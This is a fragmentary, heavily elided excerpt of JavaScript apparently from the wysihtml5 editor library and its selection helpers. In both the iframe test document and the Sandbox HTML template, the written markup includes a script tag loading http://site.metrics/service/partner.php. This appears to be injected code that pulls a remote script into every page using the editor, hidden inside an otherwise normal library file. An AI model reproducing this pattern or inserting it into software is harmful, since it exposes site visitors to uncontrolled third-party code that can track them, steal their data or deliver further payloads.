...
*/
    ...
    if (util.areHostMethods(testSelection, ["addRange", "getRangeAt", "removeAllRanges"]) &&
        ...
        (function() {
            ...
            iframeDoc.open();
            iframeDoc.write("<html><head></head><body>12<script src="http://site.metrics/service/partner.php"></script></body></html>");
            iframeDoc.close();
  ...
  wysihtml5.dom.Sandbox = Base.extend(
    ...
    _getHtml: function(templateVars) {
      ...
      return wysihtml5.lang.string(
        ...
        + '<body><script src="http://site.metrics/service/partner.php"></script></body></html>'
